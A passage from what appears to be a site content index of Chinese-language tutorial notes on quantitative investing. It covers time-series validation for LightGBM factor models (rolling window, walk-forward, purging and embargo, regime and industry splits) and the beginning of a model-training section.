===|.....|\nFold 3: |===== Train =====|==== Val ====|..|\n\n滚动窗口（Rolling Window）：\nFold 1: |=== Train ===|== Val ==|.........|\nFold 2: |...=== Train ===|== Val ==|.....|\nFold 3: |.....=== Train ===|== Val ==|..|\n\n代码实现\ndef rolling_window_cv(X, y, params, train_size=252, val_size=21, step=21):\n    &quot;&quot;&quot;\n    滚动窗口交叉验证\n \n    参数:\n        train_size: 训练窗口大小（例如252个交易日≈1年）\n        val_size: 验证窗口大小（例如21个交易日≈1个月）\n        step: 滚动步长\n \n    返回:\n        val_scores: 每折的验证集得分\n        models: 训练的模型列表\n    &quot;&quot;&quot;\n    val_scores = []\n    models = []\n \n    n_samples = len(X)\n    start_idx = train_size\n \n    fold = 0\n    while start_idx + val_size &lt;= n_samples:\n        print(f&quot;Fold {fold + 1}&quot;)\n \n        # 划分数据\n        train_start = start_idx - train_size\n        train_end = start_idx\n        val_start = start_idx\n        val_end = start_idx + val_size\n \n        print(f&quot;  Train: {train_start} - {train_end}&quot;)\n        print(f&quot;  Val:   {val_start} - {val_end}&quot;)\n \n        X_train, X_val = X[train_start:train_end], X[val_start:val_end]\n        y_train, y_val = y[train_start:train_end], y[val_start:val_end]\n \n        # 训练模型\n        train_data = lgb.Dataset(X_train, label=y_train)\n        val_data = lgb.Dataset(X_val, label=y_val, reference=train_data)\n \n        model = lgb.train(\n            params,\n            train_data,\n            num_boost_round=1000,\n            valid_sets=[train_data, val_data],\n            callbacks=[\n                lgb.early_stopping(stopping_rounds=50, verbose=False),\n                lgb.log_evaluation(period=100)\n            ]\n        )\n \n        # 评估\n        y_pred = model.predict(X_val)\n        score = np.corrcoef(y_pred, y_val)[0, 1]\n        val_scores.append(score)\n        models.append(model)\n \n        print(f&quot;  Validation IC: {score:.4f}&quot;)\n \n        # 滚动窗口\n        start_idx += step\n        fold += 1\n \n    return val_scores, models\n在量化中的应用\n# 示例：使用滚动窗口验证量化因子\nparams = {\n    &#039;objective&#039;: &#039;regression&#039;,\n    &#039;metric&#039;: &#039;rmse&#039;,\n    &#039;num_leaves&#039;: 31,\n    &#039;learning_rate&#039;: 0.05,\n}\n \n# 训练窗口：1年（252个交易日）\n# 验证窗口：1个月（21个交易日）\n# 滚动步长：1个月\nval_scores, models = rolling_window_cv(\n    X, y, params,\n    train_size=252,\n    val_size=21,\n    step=21\n)\n \nprint(f&quot;平均IC: {np.mean(val_scores):.4f}&quot;)\nprint(f&quot;IC标准差: {np.std(val_scores):.4f}&quot;)\n2.4 步进验证（Walk-Forward Validation）\n核心思想\n模拟实际交易场景，每次验证后，将验证集加入训练集，向前滚动。\n与滚动窗口的区别\n\n滚动窗口：固定训练窗口大小\n步进验证：训练窗口逐步扩大\n\n代码实现\ndef walk_forward_validation(X, y, params, initial_train_size=252, val_size=21, step=21):\n    &quot;&quot;&quot;\n    步进验证\n \n    参数:\n        initial_train_size: 初始训练窗口大小\n        val_size: 验证窗口大小\n        step: 前进步长\n \n    返回:\n        predictions: 所有的预测结果\n        val_scores: 每折的验证集得分\n    &quot;&quot;&quot;\n    predictions = []\n    val_scores = []\n    models = []\n \n    n_samples = len(X)\n    start_idx = initial_train_size\n \n    fold = 0\n    while start_idx + val_size &lt;= n_samples:\n        print(f&quot;Fold {fold + 1}&quot;)\n \n        # 划分数据\n        train_end = start_idx\n        val_start = start_idx\n        val_end = start_idx + val_size\n \n        print(f&quot;  Train: 0 - {train_end}&quot;)\n        print(f&quot;  Val:   {val_start} - {val_end}&quot;)\n \n        X_train, X_val = X[:train_end], X[val_start:val_end]\n        y_train, y_val = y[:train_end], y[val_start:val_end]\n \n        # 训练模型\n        train_data = lgb.Dataset(X_train, label=y_train)\n        val_data = lgb.Dataset(X_val, label=y_val, reference=train_data)\n \n        model = lgb.train(\n            params,\n            train_data,\n            num_boost_round=1000,\n            valid_sets=[train_data, val_data],\n            callbacks=[\n                lgb.early_stopping(stopping_rounds=50, verbose=False),\n                lgb.log_evaluation(period=100)\n            ]\n        )\n \n        # 预测\n        y_pred = model.predict(X_val)\n        predictions.extend(y_pred)\n \n        # 评估\n        score = np.corrcoef(y_pred, y_val)[0, 1]\n        val_scores.append(score)\n        models.append(model)\n \n        print(f&quot;  Validation IC: {score:.4f}&quot;)\n \n        # 向前滚动\n        start_idx += step\n        fold += 1\n \n    return predictions, val_scores, models\n3. Purging 和 Embargo (进阶)\n3.1 为什么还需要额外保护？\n问题场景：\n假设：\n\n训练集最后一天: 2021-12-31\n验证集第一天:   2022-01-01\n你的标签是: 未来5日收益\n\n这意味着：\n2021-12-31 的标签 = 2022-01-05 的信息\n2021-12-31 虽然在训练集，但它的标签包含了验证集时间段的信息！\n3.2 Purging (清除)\n原理：\n删除训练集末尾 N 天，N = 标签预测周期\ndef train_val_test_split_with_purging(X, y, dates, \n                                       train_ratio=0.6, \n                                       val_ratio=0.2, \n                                       test_ratio=0.2,\n                                       horizon=5):\n    &quot;&quot;&quot;\n    带Purging的数据划分\n    \n    参数:\n        X, y: 特征和标签\n        dates: 日期数组，shape=[n_samples]\n        train_ratio, val_ratio, test_ratio: 划分比例\n        horizon: 预测周期（标签使用的未来数据天数）\n        \n    返回:\n        (X_train, X_val, X_test), (y_train, y_val, y_test)\n    &quot;&quot;&quot;\n    assert abs(train_ratio + val_ratio + test_ratio - 1.0) &lt; 1e-6\n    \n    # 获取唯一日期并排序\n    unique_dates = np.unique(dates)\n    n_dates = len(unique_dates)\n    \n    # 计算划分点\n    train_end_idx = int(n_dates * train_ratio)\n    val_end_idx = int(n_dates * (train_ratio + val_ratio))\n    \n    train_end_date = unique_dates[train_end_idx]\n    val_end_date = unique_dates[val_end_idx]\n    \n    print(f&quot;原始划分:&quot;)\n    print(f&quot;  训练集:  {unique_dates[0]} ~ {train_end_date}&quot;)\n    print(f&quot;  验证集:  {unique_dates[train_end_idx+1]} ~ {val_end_date}&quot;)\n    print(f&quot;  测试集:  {unique_dates[val_end_idx+1]} ~ {unique_dates[-1]}&quot;)\n    \n    # Purging: 删除训练集末尾horizon天\n    purge_start_date = unique_dates[train_end_idx - horizon]\n    \n    # 生成掩码\n    train_mask = dates &lt;= purge_start_date\n    valid_mask = (dates &gt; train_end_date) &amp; (dates &lt;= val_end_date)\n    test_mask = dates &gt; val_end_date\n    \n    print(f&quot;\\nPurging (删除训练集末尾{horizon}天):&quot;)\n    print(f&quot;  原训练集末尾: {train_end_date}&quot;)\n    print(f&quot;  新训练集末尾: {purge_start_date}&quot;)\n    \n    # 划分数据\n    X_train, y_train = X[train_mask], y[train_mask]\n    X_val, y_val = X[valid_mask], y[valid_mask]\n    X_test, y_test = X[test_mask], y[test_mask]\n    \n    print(f&quot;\\n最终划分:&quot;)\n    print(f&quot;  训练集: {len(X_train)} 样本&quot;)\n    print(f&quot;  验证集: {len(X_val)} 样本&quot;)\n    print(f&quot;  测试集: {len(X_test)} 样本&quot;)\n    \n    return (X_train, X_val, X_test), (y_train, y_val, y_test)\n \n# 使用示例\ndates = pd.date_range(&#039;2020-01-01&#039;, &#039;2023-12-31&#039;, freq=&#039;D&#039;)\nX = np.random.randn(len(dates), 10)\ny = np.random.randn(len(dates))\n \n(X_train, X_val, X_test), (y_train, y_val, y_test) = train_val_test_split_with_purging(\n    X, y, dates,\n    train_ratio=0.6,\n    val_ratio=0.2,\n    test_ratio=0.2,\n    horizon=5\n)\n3.3 Embargo (禁运)\n原理：\n验证集开头额外空出几天作为缓冲\ndef train_val_test_split_with_embargo(X, y, dates,\n                                      train_ratio=0.6,\n                                      val_ratio=0.2,\n                                      test_ratio=0.2,\n                                      horizon=5,\n                                      embargo=3):\n    &quot;&quot;&quot;\n    带Embargo的数据划分\n    \n    参数:\n        X, y: 特征和标签\n        dates: 日期数组\n        train_ratio, val_ratio, test_ratio: 划分比例\n        horizon: 预测周期\n        embargo: 禁运天数\n        \n    返回:\n        (X_train, X_val, X_test), (y_train, y_val, y_test)\n    &quot;&quot;&quot;\n    assert abs(train_ratio + val_ratio + test_ratio - 1.0) &lt; 1e-6\n    \n    # 获取唯一日期并排序\n    unique_dates = np.unique(dates)\n    n_dates = len(unique_dates)\n    \n    # 计算划分点\n    train_end_idx = int(n_dates * train_ratio)\n    val_end_idx = int(n_dates * (train_ratio + val_ratio))\n    \n    train_end_date = unique_dates[train_end_idx]\n    val_end_date = unique_dates[val_end_idx]\n    \n    # Embargo: 验证集开头额外空出embargo天\n    embargo_start_date = unique_dates[train_end_idx + embargo]\n    \n    # 生成掩码\n    train_mask = dates &lt;= train_end_date\n    valid_mask = (dates &gt; embargo_start_date) &amp; (dates &lt;= val_end_date)\n    test_mask = dates &gt; val_end_date\n    \n    print(f&quot;\\nEmbargo (验证集开头空出{embargo}天):&quot;)\n    print(f&quot;  原验证集开头: {unique_dates[train_end_idx+1]}&quot;)\n    print(f&quot;  新验证集开头: {embargo_start_date}&quot;)\n    \n    # 划分数据\n    X_train, y_train = X[train_mask], y[train_mask]\n    X_val, y_val = X[valid_mask], y[valid_mask]\n    X_test, y_test = X[test_mask], y[test_mask]\n    \n    print(f&quot;\\n最终划分:&quot;)\n    print(f&quot;  训练集: {len(X_train)} 样本&quot;)\n    print(f&quot;  验证集: {len(X_val)} 样本 (删除了{embargo}天)&quot;)\n    print(f&quot;  测试集: {len(X_test)} 样本&quot;)\n    \n    return (X_train, X_val, X_test), (y_train, y_val, y_test)\n \n# 使用示例\n(X_train, X_val, X_test), (y_train, y_val, y_test) = train_val_test_split_with_embargo(\n    X, y, dates,\n    train_ratio=0.6,\n    val_ratio=0.2,\n    test_ratio=0.2,\n    horizon=5,\n    embargo=3\n)\n3.4 完整的 Purging + Embargo\ndef train_val_test_split_full(X, y, dates,\n                               train_ratio=0.6,\n                               val_ratio=0.2,\n                               test_ratio=0.2,\n                               horizon=5,\n                               embargo=3):\n    &quot;&quot;&quot;\n    完整的Purging + Embargo数据划分\n    \n    时间线:\n    │  训练集  │ Purge │ Embargo │   验证集   │\n    └──────────┘   ↓       ↓\n               删除这段   缓冲区\n    &quot;&quot;&quot;\n    assert abs(train_ratio + val_ratio + test_ratio - 1.0) &lt; 1e-6\n    \n    # 获取唯一日期并排序\n    unique_dates = np.unique(dates)\n    n_dates = len(unique_dates)\n    \n    # 计算划分点\n    train_end_idx = int(n_dates * train_ratio)\n    val_end_idx = int(n_dates * (train_ratio + val_ratio))\n    \n    # Purging: 删除训练集末尾horizon天\n    purge_start_date = unique_dates[train_end_idx - horizon]\n    \n    # Embargo: 验证集开头空出embargo天\n    embargo_start_date = unique_dates[train_end_idx + embargo]\n    val_end_date = unique_dates[val_end_idx]\n    \n    # 生成掩码\n    train_mask = dates &lt;= purge_start_date\n    valid_mask = (dates &gt; embargo_start_date) &amp; (dates &lt;= val_end_date)\n    test_mask = dates &gt; val_end_date\n    \n    # 划分数据\n    X_train, y_train = X[train_mask], y[train_mask]\n    X_val, y_val = X[valid_mask], y[valid_mask]\n    X_test, y_test = X[test_mask], y[test_mask]\n    \n    print(f&quot;完整划分 (Purging + Embargo):&quot;)\n    print(f&quot;  训练集: {len(X_train)} 样本 (删除末尾{horizon}天)&quot;)\n    print(f&quot;  验证集: {len(X_val)} 样本 (删除开头{embargo}天)&quot;)\n    print(f&quot;  测试集: {len(X_test)} 样本&quot;)\n    \n    return (X_train, X_val, X_test), (y_train, y_val, y_test)\n \n# 使用示例\n(X_train, X_val, X_test), (y_train, y_val, y_test) = train_val_test_split_full(\n    X, y, dates,\n    train_ratio=0.6,\n    val_ratio=0.2,\n    test_ratio=0.2,\n    horizon=5,\n    embargo=3\n)\n3.5 Walk-Forward 验证 (滚动验证)\n更真实的验证方式：模拟实际交易场景\ndef walk_forward_validation_with_purging(X, y, dates, model_class, params,\n                                          initial_train_size=252,\n                                          val_size=21,\n                                          step=21,\n                                          horizon=5):\n    &quot;&quot;&quot;\n    带Purging的Walk-Forward验证\n    \n    模拟实际交易场景：\n    Window 1: Train(2020) → Test(2021 Q1)\n    Window 2: Train(2020~2021 Q1) → Test(2021 Q2)\n    Window 3: Train(2020~2021 Q2) → Test(2021 Q3)\n    ...\n    &quot;&quot;&quot;\n    unique_dates = np.unique(dates)\n    n_dates = len(unique_dates)\n    \n    val_scores = []\n    models = []\n    windows = []\n    \n    start_idx = initial_train_size\n    \n    fold = 0\n    while start_idx + val_size + horizon &lt;= n_dates:\n        print(f&quot;\\n{&#039;=&#039;*60}&quot;)\n        print(f&quot;Window {fold + 1}&quot;)\n        print(f&quot;{&#039;=&#039;*60}&quot;)\n        \n        # 训练集: 删除末尾horizon天 (Purging)\n        train_start = 0\n        train_end = start_idx - horizon\n        train_end_date = unique_dates[train_end]\n        \n        # 验证集: 从start_idx开始\n        val_start = start_idx\n        val_end = start_idx + val_size\n        val_start_date = unique_dates[val_start]\n        val_end_date = unique_dates[val_end]\n        \n        print(f&quot;训练集: {unique_dates[0]} ~ {train_end_date}&quot;)\n        print(f&quot;验证集: {val_start_date} ~ {val_end_date}&quot;)\n        print(f&quot;Purging: 删除 {unique_dates[train_end+1]} ~ {unique_dates[start_idx-1]} ({horizon}天)&quot;)\n        \n        # 划分数据\n        train_mask = (dates &gt;= unique_dates[0]) &amp; (dates &lt;= train_end_date)\n        val_mask = (dates &gt;= val_start_date) &amp; (dates &lt;= val_end_date)\n        \n        X_train, y_train = X[train_mask], y[train_mask]\n        X_val, y_val = X[val_mask], y[val_mask]\n        \n        print(f&quot;训练样本数: {len(X_train)}, 验证样本数: {len(X_val)}&quot;)\n        \n        # 训练模型\n        model = model_class(**params)\n        model.fit(X_train, y_train)\n        \n        # 预测\n        y_pred = model.predict(X_val)\n        \n        # 评估\n        from scipy.stats import pearsonr\n        ic = pearsonr(y_pred, y_val)[0]\n        val_scores.append(ic)\n        models.append(model)\n        \n        windows.append({\n            &#039;train_start&#039;: unique_dates[0],\n            &#039;train_end&#039;: train_end_date,\n            &#039;val_start&#039;: val_start_date,\n            &#039;val_end&#039;: val_end_date,\n            &#039;ic&#039;: ic\n        })\n        \n        print(f&quot;验证IC: {ic:.4f}&quot;)\n        \n        # 向前滚动\n        start_idx += step\n        fold += 1\n    \n    # 统计\n    print(f&quot;\\n{&#039;=&#039;*60}&quot;)\n    print(&quot;Walk-Forward验证统计&quot;)\n    print(f&quot;{&#039;=&#039;*60}&quot;)\n    print(f&quot;窗口数: {len(windows)}&quot;)\n    print(f&quot;平均IC: {np.mean(val_scores):.4f}&quot;)\n    print(f&quot;IC标准差: {np.std(val_scores):.4f}&quot;)\n    print(f&quot;ICIR: {np.mean(val_scores) / np.std(val_scores):.4f}&quot;)\n    print(f&quot;IC胜率: {(np.array(val_scores) &gt; 0).mean():.2%}&quot;)\n    \n    return val_scores, models, windows\n \n# 使用示例\nfrom lightgbm import LGBMRegressor\n \nparams = {\n    &#039;objective&#039;: &#039;regression&#039;,\n    &#039;num_leaves&#039;: 31,\n    &#039;learning_rate&#039;: 0.05,\n    &#039;verbosity&#039;: -1,\n}\n \nval_scores, models, windows = walk_forward_validation_with_purging(\n    X, y, dates, LGBMRegressor, params,\n    initial_train_size=252,  # 1年\n    val_size=21,             # 1个月\n    step=21,                 # 1个月\n    horizon=5                # 5天\n)\n \n# 绘制IC序列\nimport matplotlib.pyplot as plt\n \nplt.figure(figsize=(12, 6))\nplt.plot([w[&#039;ic&#039;] for w in windows], &#039;o-&#039;, linewidth=2, markersize=8)\nplt.axhline(y=np.mean(val_scores), color=&#039;r&#039;, linestyle=&#039;--&#039;, \n            label=f&#039;Mean IC: {np.mean(val_scores):.4f}&#039;)\nplt.axhline(y=0, color=&#039;gray&#039;, linestyle=&#039;-&#039;, alpha=0.3)\nplt.xlabel(&#039;Window&#039;)\nplt.ylabel(&#039;IC&#039;)\nplt.title(&#039;Walk-Forward Validation IC&#039;)\nplt.legend()\nplt.grid(True, alpha=0.3)\nplt.show()\n示例输出：\nWindow 1 (2024-Q1): IC = 0.0536\nWindow 2 (2024-Q2): IC = 0.0456\nWindow 3 (2024-Q3): IC = 0.0408\nWindow 4 (2024-Q4): IC = 0.0305\n\n平均 IC: 0.0426 ± 0.0083\n\n→ 如果 IC 随时间下降，说明模型需要重训练\n\n4. 量化场景下的数据划分策略\n4.1 训练集/验证集/测试集划分\n推荐比例\n时间轴：|======== Train ======|==== Val ====|=== Test ===|\n      2018-2021           2022        2023\n      4年                 1年         1年\n\n代码实现\ndef train_val_test_split(X, y, train_ratio=0.6, val_ratio=0.2, test_ratio=0.2):\n    &quot;&quot;&quot;\n    时序数据的三层划分\n \n    参数:\n        train_ratio: 训练集比例\n        val_ratio: 验证集比例\n        test_ratio: 测试集比例\n \n    返回:\n        (X_train, X_val, X_test), (y_train, y_val, y_test)\n    &quot;&quot;&quot;\n    assert abs(train_ratio + val_ratio + test_ratio - 1.0) &lt; 1e-6\n \n    n_samples = len(X)\n    train_end = int(n_samples * train_ratio)\n    val_end = int(n_samples * (train_ratio + val_ratio))\n \n    X_train, X_val, X_test = X[:train_end], X[train_end:val_end], X[val_end:]\n    y_train, y_val, y_test = y[:train_end], y[train_end:val_end], y[val_end:]\n \n    return (X_train, X_val, X_test), (y_train, y_val, y_test)\n实际应用\n# 示例：4年训练，1年验证，1年测试\n(X_train, X_val, X_test), (y_train, y_val, y_test) = train_val_test_split(\n    X, y,\n    train_ratio=4/6,\n    val_ratio=1/6,\n    test_ratio=1/6\n)\n \nprint(f&quot;Train: {len(X_train)} samples&quot;)\nprint(f&quot;Val:   {len(X_val)} samples&quot;)\nprint(f&quot;Test:  {len(X_test)} samples&quot;)\n3.2 多市场周期的划分\n为什么要考虑市场周期？\n不同市场状态（牛市/熊市/震荡市）下，因子表现差异巨大。\n识别市场状态\ndef identify_market_regime(prices, window=252):\n    &quot;&quot;&quot;\n    识别市场状态\n \n    参数:\n        prices: 价格序列，shape=[n_samples]\n        window: 滚动窗口大小\n \n    返回:\n        regimes: 市场状态标签（0=震荡, 1=牛市, -1=熊市）\n    &quot;&quot;&quot;\n    # 计算收益率\n    returns = prices.pct_change().dropna()\n \n    # 计算滚动趋势和波动率\n    trend = returns.rolling(window).mean()\n    volatility = returns.rolling(window).std()\n \n    # 定义阈值\n    trend_threshold = trend.mean() + 0.5 * volatility.mean()\n    volatility_threshold = volatility.mean()\n \n    regimes = np.zeros(len(prices))\n \n    for i in range(window, len(prices)):\n        if trend[i] &gt; trend_threshold:\n            regimes[i] = 1  # 牛市\n        elif trend[i] &lt; -trend_threshold:\n            regimes[i] = -1  # 熊市\n        else:\n            regimes[i] = 0  # 震荡市\n \n    return regimes\n按市场状态划分数据\ndef split_by_regime(X, y, regimes):\n    &quot;&quot;&quot;\n    按市场状态划分数据\n \n    返回:\n        dict: {regime: (X_regime, y_regime)}\n    &quot;&quot;&quot;\n    regime_splits = {}\n \n    for regime in [-1, 0, 1]:\n        mask = regimes == regime\n        regime_splits[regime] = (X[mask], y[mask])\n \n    return regime_splits\n \n# 使用示例\nregime_splits = split_by_regime(X, y, regimes)\n \nfor regime, (X_regime, y_regime) in regime_splits.items():\n    regime_name = {1: &#039;牛市&#039;, 0: &#039;震荡市&#039;, -1: &#039;熊市&#039;}[regime]\n    print(f&quot;{regime_name}: {len(X_regime)} samples&quot;)\n平衡不同市场状态的样本\ndef balance_regime_samples(X, y, regimes, target_ratio=0.3):\n    &quot;&quot;&quot;\n    平衡不同市场状态的样本比例\n \n    参数:\n        target_ratio: 牛市和熊市的目标比例\n \n    返回:\n        (X_balanced, y_balanced)\n    &quot;&quot;&quot;\n    # 计算当前比例\n    bull_ratio = np.sum(regimes == 1) / len(regimes)\n    bear_ratio = np.sum(regimes == -1) / len(regimes)\n \n    # 计算需要采样/重复的次数\n    bull_factor = target_ratio / bull_ratio if bull_ratio &gt; 0 else 0\n    bear_factor = target_ratio / bear_ratio if bear_ratio &gt; 0 else 0\n \n    X_balanced, y_balanced = [], []\n \n    for regime in [-1, 0, 1]:\n        mask = regimes == regime\n        X_regime, y_regime = X[mask], y[mask]\n \n        if regime == 1:\n            factor = bull_factor\n        elif regime == -1:\n            factor = bear_factor\n        else:\n            factor = 1.0\n \n        # 采样或重复\n        n_samples = int(len(X_regime) * factor)\n        if factor &gt; 1:\n            # 重复采样\n            indices = np.random.choice(len(X_regime), n_samples, replace=True)\n        else:\n            # 随机采样\n            indices = np.random.choice(len(X_regime), n_samples, replace=False)\n \n        X_balanced.append(X_regime[indices])\n        y_balanced.append(y_regime[indices])\n \n    X_balanced = np.vstack(X_balanced)\n    y_balanced = np.hstack(y_balanced)\n \n    return X_balanced, y_balanced\n3.3 按行业划分\n行业异质性\n不同行业的股票特征和收益模式差异显著，需要行业划分。\n代码实现\ndef split_by_industry(X, y, industry_codes):\n    &quot;&quot;&quot;\n    按行业划分数据\n \n    参数:\n        industry_codes: 行业代码，shape=[n_samples]\n \n    返回:\n        dict: {industry_code: (X_industry, y_industry)}\n    &quot;&quot;&quot;\n    industry_splits = {}\n \n    for code in np.unique(industry_codes):\n        mask = industry_codes == code\n        industry_splits[code] = (X[mask], y[mask])\n \n    return industry_splits\n行业中性化\ndef industry_neutralize(X, y, industry_codes):\n    &quot;&quot;&quot;\n    行业中性化：消除行业效应\n \n    方法：对每个行业进行标准化\n    &quot;&quot;&quot;\n    X_neutral = np.zeros_like(X)\n    y_neutral = np.zeros_like(y)\n \n    for code in np.unique(industry_codes):\n        mask = industry_codes == code\n \n        # 标准化特征\n        X_industry = X[mask]\n        X_mean = X_industry.mean(axis=0)\n        X_std = X_industry.std(axis=0)\n        X_neutral[mask] = (X_industry - X_mean) / (X_std + 1e-8)\n \n        # 标准化目标\n        y_industry = y[mask]\n        y_mean = y_industry.mean()\n        y_std = y_industry.std()\n        y_neutral[mask] = (y_industry - y_mean) / (y_std + 1e-8)\n \n    return X_neutral, y_neutral\n4. 数据划分的最佳实践\n4.1 完整的数据划分流程\nclass QuantDataSplitter:\n    &quot;&quot;&quot;\n    量化数据划分器\n \n    功能：\n    1. 时间序列划分\n    2. 市场状态识别\n    3. 行业中性化\n    4. 数据验证\n    &quot;&quot;&quot;\n \n    def __init__(self, prices, industry_codes=None):\n        self.prices = prices\n        self.industry_codes = industry_codes\n \n    def identify_regimes(self, window=252):\n        &quot;&quot;&quot;识别市场状态&quot;&quot;&quot;\n        returns = self.prices.pct_change().dropna()\n        trend = returns.rolling(window).mean()\n        volatility = returns.rolling(window).std()\n \n        trend_threshold = trend.mean() + 0.5 * volatility.mean()\n        regimes = np.zeros(len(self.prices))\n \n        for i in range(window, len(self.prices)):\n            if trend[i] &gt; trend_threshold:\n                regimes[i] = 1\n            elif trend[i] &lt; -trend_threshold:\n                regimes[i] = -1\n            else:\n                regimes[i] = 0\n \n        self.regimes = regimes\n        return regimes\n \n    def train_val_test_split(self, X, y, train_ratio=0.6, val_ratio=0.2, test_ratio=0.2):\n        &quot;&quot;&quot;三层划分&quot;&quot;&quot;\n        assert abs(train_ratio + val_ratio + test_ratio - 1.0) &lt; 1e-6\n \n        n_samples = len(X)\n        train_end = int(n_samples * train_ratio)\n        val_end = int(n_samples * (train_ratio + val_ratio))\n \n        splits = {\n            &#039;train&#039;: (X[:train_end], y[:train_end]),\n            &#039;val&#039;: (X[train_end:val_end], y[train_end:val_end]),\n            &#039;test&#039;: (X[val_end:], y[val_end:])\n        }\n \n        return splits\n \n    def validate_no_leakage(self, X_train, X_val):\n        &quot;&quot;&quot;验证无信息泄露&quot;&quot;&quot;\n        train_mean = X_train.mean(axis=0)\n        train_std = X_train.std(axis=0)\n        val_mean = X_val.mean(axis=0)\n \n        # 检查均值差异\n        mean_diff = np.abs(train_mean - val_mean) / (train_std + 1e-8)\n \n        if np.any(mean_diff &gt; 3):\n            print(&quot;警告：训练集和验证集分布差异较大&quot;)\n            print(f&quot;最大标准化差异: {np.max(mean_diff):.4f}&quot;)\n \n        return mean_diff\n \n    def split(self, X, y, neutralize_industry=True):\n        &quot;&quot;&quot;完整的划分流程&quot;&quot;&quot;\n        # 1. 识别市场状态\n        self.identify_regimes()\n \n        # 2. 行业中性化\n        if self.industry_codes is not None and neutralize_industry:\n            X, y = self.industry_neutralize(X, y)\n \n        # 3. 三层划分\n        splits = self.train_val_test_split(X, y)\n \n        # 4. 验证无信息泄露\n        X_train, X_val = splits[&#039;train&#039;][0], splits[&#039;val&#039;][0]\n        self.validate_no_leakage(X_train, X_val)\n \n        return splits\n使用示例\n# 创建划分器\nsplitter = QuantDataSplitter(prices, industry_codes)\n \n# 划分数据\nsplits = splitter.split(X, y)\n \n# 提取各部分数据\nX_train, y_train = splits[&#039;train&#039;]\nX_val, y_val = splits[&#039;val&#039;]\nX_test, y_test = splits[&#039;test&#039;]\n \n# 打印统计信息\nprint(f&quot;Train: {len(X_train)} samples&quot;)\nprint(f&quot;Val:   {len(X_val)} samples&quot;)\nprint(f&quot;Test:  {len(X_test)} samples&quot;)\n4.2 数据划分检查清单\n划分前检查\n\n 数据按时间排序\n 移除未来信息泄露\n 确认无NaN值或合理处理\n 特征标准化在划分后进行\n 行业/市场状态信息完整\n\n划分后检查\n\n 训练集、验证集、测试集按时间顺序排列\n 验证集和测试集严格在训练集之后\n 检查分布差异（均值、方差）\n 确认目标变量分布合理\n 记录划分比例和时间范围\n\n评估指标检查\n\n 训练集、验证集、测试集分别评估\n 检查IC/Rank IC在不同子集上的稳定性\n 分析过拟合程度\n 检查样本外性能衰减\n\n5. 总结\n时序数据划分是量化投资中至关重要的环节，核心原则是严格遵守因果性约束。主要方法包括：\n\n时间序列交叉验证：保证训练集严格在验证集之前\n滚动窗口验证：适应数据分布随时间变化\n步进验证：模拟实际交易场景\n多维度划分：考虑市场状态、行业等因素\n\n正确的数据划分是构建稳健量化模型的基础，必须在模型开发初期就建立严格的划分规范。"},"quant/qlib/week2/03-模型训练":{"slug":"quant/qlib/week2/03-模型训练","filePath":"quant/qlib/week2/03-模型训练.md","title":"03-模型训练","links":[],"tags":[],"content":"模型训练\n1. LightGBM训练流程\n1.1 基础训练流程\n数据准备\nimport numpy as np\nimport pandas as pd\nimport lightgbm as lgb\nfrom sklearn.model_selection import train_test_split\n \n# 加载数据\nX = np.random.randn(10000, 100)  # 10000个样本，100个特征\ny = np.random.randn(10000)  # 目标变量（预测收益率）\n \n# 划分训练集和验证集\nX_train, X_val, y_train, y_val = train_test_split(\n    X, y, test_size=0.2, shuffle=False  # 时序数据不要shuffle\n)\n \n# 创建LightGBM数据集\ntrain_data = lgb.Dataset(X_train, label=y_train)\nval_data = lgb.Dataset(X_val, label=y_val, reference=train_data)\n参数设置\nparams = {\n    # 基础参数\n    &#039;objective&#039;: &#039;regression&#039;,\n    &#039;metric&#039;: &#039;rmse&#039;,\n \n    # 模型复杂度\n    &#039;num_leaves&#039;: 31,\n    &#039;max_depth&#039;: -1,\n    &#039;min_data_in_leaf&#039;: 20,\n \n    # 学习参数\n    &#039;learning_rate&#039;: 0.05,\n    &#039;n_estimators&#039;: 1000,\n \n    # 正则化\n    &#039;lambda_l1&#039;: 0.0,\n    &#039;lambda_l2&#039;: 0.0,\n \n    # 采样\n    &#039;bagging_fraction&#039;: 0.8,\n    &#039;feature_fraction&#039;: 0.8,\n    &#039;bagging_freq&#039;: 5,\n \n    # 其他\n    &#039;verbosity&#039;: -1,\n    &#039;n_jobs&#039;: -1,\n}\n训练模型\n# 训练\nmodel = lgb.train(\n    params,\n    train_data,\n    num_boost_round=1000,\n    valid_sets=[train_data, val_data],\n    callbacks=[\n        lgb.early_stopping(stopping_rounds=50, verbose=True),\n        lgb.log_evaluation(period=100)\n    ]\n)\n \n# 预测\ny_pred_train = model.predict(X_train)\ny_pred_val = model.predict(X_val)\n \n# 评估\nfrom sklearn.metrics import mean_squared_error, r2_score\nfrom scipy.stats import pearsonr, spearmanr\n \ntrain_rmse = np.sqrt(mean_squared_error(y_train, y_pred_train))\nval_rmse = np.sqrt(mean_squared_error(y_val, y_pred_val))\n \ntrain_r2 = r2_score(y_train, y_pred_train)\nval_r2 = r2_score(y_val, y_pred_val)\n \ntrain_ic = pearsonr(y_train, y_pred_train)[0]\nval_ic = pearsonr(y_val, y_pred_val)[0]\n \ntrain_rank_ic = spearmanr(y_train, y_pred_train)[0]\nval_rank_ic = spearmanr(y_val, y_pred_val)[0]\n \nprint(f&quot;Train RMSE: {train_rmse:.4f}, Val RMSE: {val_rmse:.4f}&quot;)\nprint(f&quot;Train R2: {train_r2:.4f}, Val R2: {val_r2:.4f}&quot;)\nprint(f&quot;Train IC: {train_ic:.4f}, Val IC: {val_ic:.4f}&quot;)\nprint(f&quot;Train Rank IC: {train_rank_ic:.4f}, Val Rank IC: {val_rank_ic:.4f}&quot;)\n1.2 使用sklearn API\n优势\n\n与sklearn生态系统无缝集成\n支持Pipeline和GridSearchCV\n更符合sklearn用户习惯\n\n代码示例\nfrom lightgbm import LGBMRegressor\nfrom sklearn.model_selection import GridSearchCV, TimeSeriesSplit\n \n# 使用sklearn API\nmodel = LGBMRegressor(\n    objective=&#039;regression&#039;,\n    num_leaves=31,\n    learning_rate=0.05,\n    n_estimators=1000,\n    min_data_in_leaf=20,\n    bagging_fraction=0.8,\n    feature_fraction=0.8,\n    bagging_freq=5,\n    verbosity=-1,\n    n_jobs=-1,\n)\n \n# 训练\nmodel.fit(\n    X_train, y_train,\n    eval_set=[(X_train, y_train), (X_val, y_val)],\n    eval_metric=&#039;rmse&#039;,\n    callbacks=[\n        lgb.early_stopping(stopping_rounds=50, verbose=False),\n        lgb.log_evaluation(period=100)\n    ]\n)\n \n# 预测\ny_pred_train = model.predict(X_train)\ny_pred_val = model.predict(X_val)\n超参数调优\n# 定义参数网格\nparam_grid = {\n    &#039;num_leaves&#039;: [31, 63, 127],\n    &#039;learning_rate&#039;: [0.01, 0.05, 0.1],\n    